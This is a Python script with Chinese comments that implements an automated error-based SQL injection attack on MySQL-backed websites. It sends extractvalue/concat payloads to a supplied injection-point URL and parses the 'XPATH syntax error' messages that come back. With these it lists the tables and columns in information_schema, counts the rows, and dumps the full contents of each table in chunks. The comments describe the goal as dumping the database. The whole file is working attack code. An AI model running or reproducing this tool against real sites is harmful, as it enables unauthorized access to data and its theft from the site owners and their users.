# -*- coding: utf-8 -*-
# -*- ver	: >=3.8.0 -*-
# -*- coder : CO0kie丶 -*-
# -*- time  : 20201119 -*-
import requests
import re
import pprint

pp = pprint.PrettyPrinter(indent=1)


def GetResult_ERROR_COLUMN(Url, Table, Column, Str_sp='!@a@!0'):
    """
    函数：分段获取数据库信息

    :param Url: 注入点URL
    :param Table: 脱裤表名
    :param Column: 脱裤列名
    :param Str_sp: 用于分割爆破的字符串，默认为'!@a@!0'
    :return: 拼接的字符串
    """

    # 构造注入语句
    url0 = f"{Url} and extractvalue(0,concat('~',substr((%s),%d),'~'))--+"
    sql_code = f'SELECT GROUP_CONCAT({Column} SEPARATOR \'{Str_sp}\')as DT FROM {Table}'
    ret_str = ''

    # 构造返回值的长度
    ret_max = GetResult_ERROR(Url, f'SELECT LENGTH(DT) FROM({sql_code})A')

    i = 1
    while len(ret_str) < ret_max:
        # 格式化注入url
        url = url0 % (sql_code, i)

        # 注入，并得到返回长度
        content = requests.get(url=url)  # , headers=Global_Headers)
        body_len = int(content.headers['Content-Length']) \
            if 'Content-Length' in content.headers \
            else int(len(content.content))
        print("\t【网页", content.status_code, body_len, f'\t【{url}】')
        # print(content.text.replace('\r\n', ''),
        #       end='\n】原文结束\n')

        find_list = re.findall("XPATH syntax error: \'~(.*?)\'", content.text)
        for find_data in find_list:
            ret_str += find_data
            i += len(find_data)
            # print(i, ret_max, find_data, ret_str)
            if i > ret_max:
                return ret_str[:-1].split(Str_sp)
    return None
    pass


def GetResult_ERROR_SUB(Url, Sql_code, Left):
    """
    函数：分段获取数据库信息

    :param Url: 注入点URL
    :param Sql_code: 注入点语句
    :param Left: 拼接的开始点
    :return: 拼接的字符串后段
    """

    # 构造注入点
    url0 = f"{Url} and extractvalue(0,concat('~',substr((%s),%d,%d),'~'))--+"
    ret_str = ''
    while True:
        url = url0 % (Sql_code, Left, 32)

        # 测试链接，并得到返回长度
        content = requests.get(url=url)  # , headers=Global_Headers)
        body_len = int(content.headers['Content-Length']) \
            if 'Content-Length' in content.headers \
            else int(len(content.content))
        print("\t【网页", content.status_code, body_len, f'\t【{url}】')
        print(content.text.replace('\r\n', ''),
              end='\n】原文结束\n')
        if body_len == 0:
            break
        find_list = re.findall("XPATH syntax error: \'~(.*?)\'", content.text)
        print(">>re>>", find_list)
        for index, x in enumerate(find_list):
            if x[-1] == '~':  # 有闭合
                ret_str += x[:-1]
                return ret_str
            else:  # 无闭合，说明该字段被截断
                ret_str += x
                Left += len(ret_str)
    return None


def GetResult_ERROR(Url, Sql_code):
    """
    :param Url: 处理的payload注入点
    :param Sql_code: 处理的SQL语句
    :return: 返回查询结果
    """
    url = f"{Url} and extractvalue(0,concat('~',({Sql_code}),'~'))--+"
    # 测试链接，并得到返回长度
    content = requests.get(url=url)  # , headers=Global_Headers)
    body_len = int(content.headers['Content-Length']) \
        if 'Content-Length' in content.headers \
        else int(len(content.content))
    # print("\t【网页", content.status_code, body_len, f'\t【{url}】')
    # print(content.text.replace('\r\n', ''),
    #       end='\n】原文结束\n\n')
    if body_len == 0:
        return None
    find_list = re.findall("XPATH syntax error: \'~(.*?)\'", content.text)
    for index, x in enumerate(find_list):
        if x[-1] == '~':  # 有闭合
            x = x[:-1]
        else:  # 无闭合，说明该字段被截断
            print('>>>第一次读取结果', x)
            # x2 = GetResult_ERROR_SUB(Url, Sql_code, len(x))
            return x[:-1] + GetResult_ERROR_SUB(Url, Sql_code, len(x))
        return int(x) if x.isdigit() else x
    return None
    pass


def SelectTables(Url, Database, Tables, Dict_Save):
    """
    函数：爆破数据库

    :param Url: 提供的注入点
    :param Database: 提供的数据库名
    :param Tables: 提供的表名
    :param Dict_Save: 提供的字典
    :return: T/F
    """

    # 开始脱裤，循环表格名
    for tb_name in Tables.split(','):
        print('>>表名\t' + tb_name)
        Dict_Save[tb_name] = {}

        # 01 查询 表格列名
        columns = GetResult_ERROR(
            Url, 'SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS '
                 f'WHERE TABLE_NAME = \'{tb_name}\' and TABLE_SCHEMA = DATABASE()'
        ).split(',')
        print(f'>>>>{tb_name:}\t{columns}')

        # 02 查询该表行数，并初始化二维列表
        row_max = GetResult_ERROR(
            Url, f'SELECT COUNT(*) FROM {tb_name}')
        Dict_Save[tb_name]['row_len'] = row_max
        Dict_Save[tb_name]['data'] = [['行'] + columns]

        # 如果表行数为0 则下一次循环
        if row_max is None or row_max <= 0:
            continue
        lv_data = Dict_Save[tb_name]['data']
        for i in range(row_max):
            lv_data.append([i + 1])

        # 03 查询该列的所有内容
        for column_name in columns:
            tb_datas = GetResult_ERROR_COLUMN(
                Url, tb_name, column_name)

            # 04 如果返回空，则下一次循环
            if tb_datas is None:
                continue

            # 05 将值插入表
            for i in range(row_max):
                data = tb_datas[i]
                if data.isdigit():
                    data = int(data)
                lv_data[i + 1].append(data)
        # pp.pprint(Dict_Save)
    return len(Dict_Save) != 0
    pass
